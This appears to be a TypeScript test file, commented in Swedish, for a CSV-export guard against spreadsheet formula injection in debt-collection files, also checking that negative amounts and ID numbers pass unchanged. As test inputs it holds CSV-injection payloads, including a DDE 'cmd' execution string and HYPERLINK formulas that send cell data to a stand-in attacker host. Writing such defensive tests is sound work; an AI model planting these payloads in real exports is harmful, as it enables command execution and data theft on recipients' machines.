/**
 * #317 — CSV-formelinjektion i filer som lämnar systemet.
 *
 * Inkasso-CSV:erna bär gäldenärsnamn och adresser (operatörsregistrerad fritext)
 * och öppnas hos inkassobolaget. Exekveringen sker i deras Excel, men filen är
 * vår.
 *
 * DET AVGÖRANDE TESTET ÄR INTE ATT FORMLER NEUTRALISERAS — det är att NEGATIVA
 * TAL INTE GÖR DET. `-` står i den vedertagna teckenlistan, men ett negativt
 * belopp börjar också med minus, och ett blint prefix hade mislabelat det som
 * text i mottagarens import. Skyddet får inte införa ett nytt fel.
 */

import { csvCell, needsFormulaGuard } from './csv-cell'

describe('#317 — formelinjektion neutraliseras', () => {
  it.each([
    ["=cmd|' /c calc'!A0", 'klassisk kommandoexekvering'],
    ['=HYPERLINK("http://angripare.tld?"&A1,"x")', 'exfiltrering via länk'],
    ['+HYPERLINK("http://angripare.tld","x")', 'plus i stället för likhetstecken'],
    ["@SUM(1+1)*cmd|' /c calc'!A0", 'at-tecken'],
    ['-1+1', 'minus som INTE är ett tal'],
    ['\t=1+1', 'inledande tab — döljer formeln för naiva filter'],
    ['\r=1+1', 'inledande vagnretur'],
  ])('neutraliserar %s (%s)', (farligt) => {
    expect(needsFormulaGuard(farligt)).toBe(true)
    // Apostrofen är Excels egen textmarkör — visas inte, gör cellen till text.
    // Cellen kan vara citerad (om värdet bär komma/citattecken), så apostrofen
    // hävdas på INNEHÅLLET, inte på den råa strängen — annars mäter testet
    // CSV-escapen i stället för formelskyddet.
    const cell = csvCell(farligt)
    const innehall = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell
    expect(innehall.startsWith("'")).toBe(true)
    expect(innehall.slice(1)).toBe(farligt)
    // Bär värdet ett radbrytande tecken MÅSTE cellen dessutom vara citerad —
    // annars bryter det raden och apostrofen hamnar på fel sida om brottet.
    if (/[\r\n]/.test(farligt)) expect(cell.startsWith('"')).toBe(true)
  })

  it.each([
    ["Anna\r=cmd|' /c calc'!A0", 'INBÄDDAD vagnretur — formeln syns inte på position 0'],
    ["\r=cmd|' /c calc'!A0", 'INLEDANDE vagnretur'],
  ])('CITERAS: %s (%s)', (farligt) => {
    // DET HÄR ÄR TESTET SOM SAKNADES. Filen hade redan ett `\r`-fall, men det
    // hävdade bara apostrofen — aldrig CITERINGEN. Utan citering ligger det råa
    // \r kvar i raden, Excel bryter raden där, och nästa rad börjar med
    // formeln. Apostrofen skyddar ingenting i en ociterad cell.
    //
    // Den inbäddade varianten är värre: den triggar inte ens formelgrinden
    // (som bara läser position 0), så citeringen är det ENDA som står emellan.
    const cell = csvCell(farligt)
    expect(cell.startsWith('"')).toBe(true)
    expect(cell.endsWith('"')).toBe(true)
    // Och innehållet är intakt — vi citerar, vi stympar inte.
    expect(cell.slice(1, -1).replace(/""/g, '"')).toContain('=cmd')
  })

  it('ett gäldenärsnamn med formel neutraliseras OCH escapas korrekt', () => {
    // Formeln bär både komma och citattecken — båda skydden måste hålla, och
    // apostrofen ska hamna INNANFÖR citattecknen, annars bryts CSV-syntaxen.
    const cell = csvCell('=HYPERLINK("http://x.tld","Anna, Andersson")')
    expect(cell.startsWith('"\'=')).toBe(true)
    expect(cell.endsWith('"')).toBe(true)
    // Interna citattecken är dubblade enligt CSV-konventionen.
    expect(cell).toContain('""')
  })
})

describe('#317 — vad som INTE får neutraliseras', () => {
  it.each([
    ['-500.00', 'negativt belopp'],
    ['-1', 'negativt heltal'],
    ['0.00', 'noll'],
    ['2000.00', 'positivt belopp'],
    ['10060.00', 'belopp med påminnelseavgift'],
  ])('%s (%s) passerar ORÖRT — annars mislabelas talet som text', (tal) => {
    expect(needsFormulaGuard(tal)).toBe(false)
    expect(csvCell(tal)).toBe(tal)
  })

  it.each([
    ['Anna Andersson', 'vanligt namn'],
    ['Storgatan 1, 111 22 Stockholm', 'adress med komma'],
    ['Ödegård & Söner AB', 'firmanamn med tecken'],
    ['900101-1234', 'personnummer — innehåller minus men börjar inte med det'],
    ['556000-0001', 'organisationsnummer'],
    ['2026-01-31', 'datum'],
    ['', 'tom cell'],
  ])('%s (%s) är oförändrat i sak', (text) => {
    expect(needsFormulaGuard(text)).toBe(false)
    // Adressen med komma måste fortfarande citeras — det är CSV-escapen, inte
    // formelskyddet, och den ska bete sig som förut.
    const cell = csvCell(text)
    expect(cell.startsWith("'")).toBe(false)
    expect(cell.replace(/^"|"$/g, '')).toBe(text)
  })

  it('KONTROLLEN ÄR EN STRIKT REGEX, INTE Number()', () => {
    // Number('\t5') är 5 — JS trimmar blanksteg. Hade vi grindat på Number()
    // hade en cell som börjar med tab sluppit igenom bara för att resten är en
    // siffra. Regexen kräver att HELA strängen är ett tal.
    expect(needsFormulaGuard('\t5')).toBe(true)
    expect(needsFormulaGuard('5')).toBe(false)
    // Och ett "tal" med skräp efter sig är inget tal.
    expect(needsFormulaGuard('-500.00abc')).toBe(true)
    expect(needsFormulaGuard('-500,00')).toBe(true) // komma, inte punkt
  })
})
